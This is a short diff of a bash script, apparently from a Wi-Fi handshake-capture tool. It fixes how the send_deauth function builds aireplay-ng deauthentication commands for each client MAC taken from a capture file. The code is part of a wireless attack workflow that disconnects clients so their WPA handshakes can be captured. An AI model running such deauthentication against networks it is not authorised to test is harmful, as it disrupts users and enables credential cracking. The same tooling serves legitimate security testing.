@@ -118,8 +118,8 @@ send_deauth(){
     clients=($(cat ${temp_dir}/handshake-01.csv \
         | grep -E ${mac_pattern}.*${mac_pattern} | grep -oE ^${mac_pattern}))
         if [ ${#clients[@]} -gt 0 ];then
-            aireplay_cmd=(aireplay-ng --ignore-negative-one --deauth 1 -a)
             for client in ${clients[*]};do
+                aireplay_cmd=(aireplay-ng --ignore-negative-one --deauth 1 -a)
                 aireplay_cmd[${#aireplay_cmd[@]}]=${ap_bssid}
                 aireplay_cmd[${#aireplay_cmd[@]}]='-c'
                 aireplay_cmd[${#aireplay_cmd[@]}]=${client}
